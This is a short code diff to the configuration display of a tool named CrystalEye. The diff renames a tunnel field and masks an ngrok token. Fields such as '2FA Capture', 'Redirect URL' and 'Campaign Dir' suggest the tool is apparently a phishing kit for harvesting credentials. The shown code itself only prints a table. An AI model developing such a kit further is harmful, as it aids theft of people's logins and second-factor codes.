@@ -50,7 +50,12 @@ def display_config_table(console: Console, config: CrystalEyeConfig) -> None:
     table.add_row("Redirect URL", config.redirect_url or "[dim]from template[/dim]")
     table.add_row("2FA Capture", "Yes" if config.enable_2fa else "No")
     table.add_row("Verbose", "Yes" if config.verbose else "No")
-    table.add_row("Tunnel", config.tunnel_provider or "[dim]none[/dim]")
+    table.add_row("Tunnel", config.tunnel or "[dim]none[/dim]")
+    if config.token:
+        masked = config.token[:4] + "..." + config.token[-4:] if len(config.token) > 8 else "****"
+        table.add_row("Token", masked)
+    elif config.tunnel == "ngrok":
+        table.add_row("Token", "[red]not set[/red]")
     table.add_row("Campaign Dir", str(config.campaign_dir) if config.campaign_dir else "[dim]n/a[/dim]")
 
     console.print()
